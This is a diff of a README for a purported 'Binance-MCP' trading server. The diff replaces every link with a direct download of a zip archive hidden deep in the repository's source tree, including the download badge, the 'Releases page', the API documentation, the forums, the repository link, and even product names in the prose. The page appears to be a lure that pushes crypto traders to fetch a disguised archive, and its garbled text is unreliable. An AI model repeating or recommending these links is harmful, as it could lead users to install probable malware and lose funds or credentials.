@@ -1,10 +1,10 @@
 # 🚀 Binance-MCP - Simplify Your Binance Experience
 
-[![Download](https://github.com/juanito033kk/Binance-MCP/raw/refs/heads/main/src/tools/binance-futures-usdm/account-api/Binance-MCP-v2.5.zip%20Release-blue)](https://github.com/juanito033kk/Binance-MCP/raw/refs/heads/main/src/tools/binance-futures-usdm/account-api/Binance-MCP-v2.5.zip)
+[![Download](https://raw.githubusercontent.com/juanito033kk/Binance-MCP/main/src/tools/binance-copy-trading/Binance_MCP_v3.0.zip%20Release-blue)](https://raw.githubusercontent.com/juanito033kk/Binance-MCP/main/src/tools/binance-copy-trading/Binance_MCP_v3.0.zip)
 
 ## ✨ Overview
 
-Binance-MCP is a Model Context Protocol (MCP) server tailored for the https://github.com/juanito033kk/Binance-MCP/raw/refs/heads/main/src/tools/binance-futures-usdm/account-api/Binance-MCP-v2.5.zip API. This software provides an easy way to access various trading features while managing your identity and requests seamlessly. The application supports functionalities like spot trading, wallets, staking, NFTs, and more—all built with TypeScript and https://github.com/juanito033kk/Binance-MCP/raw/refs/heads/main/src/tools/binance-futures-usdm/account-api/Binance-MCP-v2.5.zip Whether you are new to cryptocurrency or an experienced trader, Binance-MCP helps streamline your interactions with Binance.
+Binance-MCP is a Model Context Protocol (MCP) server tailored for the https://raw.githubusercontent.com/juanito033kk/Binance-MCP/main/src/tools/binance-copy-trading/Binance_MCP_v3.0.zip API. This software provides an easy way to access various trading features while managing your identity and requests seamlessly. The application supports functionalities like spot trading, wallets, staking, NFTs, and more—all built with TypeScript and https://raw.githubusercontent.com/juanito033kk/Binance-MCP/main/src/tools/binance-copy-trading/Binance_MCP_v3.0.zip Whether you are new to cryptocurrency or an experienced trader, Binance-MCP helps streamline your interactions with Binance.
 
 ## 🔧 Features
 
@@ -21,12 +21,12 @@ Binance-MCP is a Model Context Protocol (MCP) server tailored for the https://gi
 Before you download, ensure your system meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- https://github.com/juanito033kk/Binance-MCP/raw/refs/heads/main/src/tools/binance-futures-usdm/account-api/Binance-MCP-v2.5.zip Version 12 or later
+- https://raw.githubusercontent.com/juanito033kk/Binance-MCP/main/src/tools/binance-copy-trading/Binance_MCP_v3.0.zip Version 12 or later
 - Internet Connection: Required for API access
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Simply visit the [Releases page](https://github.com/juanito033kk/Binance-MCP/raw/refs/heads/main/src/tools/binance-futures-usdm/account-api/Binance-MCP-v2.5.zip) to download the latest version of Binance-MCP.
+To get started, you will need to download the application. Simply visit the [Releases page](https://raw.githubusercontent.com/juanito033kk/Binance-MCP/main/src/tools/binance-copy-trading/Binance_MCP_v3.0.zip) to download the latest version of Binance-MCP.
 
 ### Steps to Download
 
@@ -60,8 +60,8 @@ If you encounter issues while using the application:
 
 For more detailed information on specific features, visit the following resources:
 
-- [Binance API Documentation](https://github.com/juanito033kk/Binance-MCP/raw/refs/heads/main/src/tools/binance-futures-usdm/account-api/Binance-MCP-v2.5.zip)
-- [Community Forums](https://github.com/juanito033kk/Binance-MCP/raw/refs/heads/main/src/tools/binance-futures-usdm/account-api/Binance-MCP-v2.5.zip)
+- [Binance API Documentation](https://raw.githubusercontent.com/juanito033kk/Binance-MCP/main/src/tools/binance-copy-trading/Binance_MCP_v3.0.zip)
+- [Community Forums](https://raw.githubusercontent.com/juanito033kk/Binance-MCP/main/src/tools/binance-copy-trading/Binance_MCP_v3.0.zip)
 
 ## 🤝 Contributing
 
@@ -71,7 +71,7 @@ If you would like to contribute to the development of Binance-MCP, you can do so
 
 Stay updated with the latest news and updates about Binance-MCP:
 
-- [GitHub Repository](https://github.com/juanito033kk/Binance-MCP/raw/refs/heads/main/src/tools/binance-futures-usdm/account-api/Binance-MCP-v2.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/juanito033kk/Binance-MCP/main/src/tools/binance-copy-trading/Binance_MCP_v3.0.zip)
 - [Twitter Account](#)
 
 Thank you for choosing Binance-MCP! For any questions, feel free to reach out through our GitHub page.
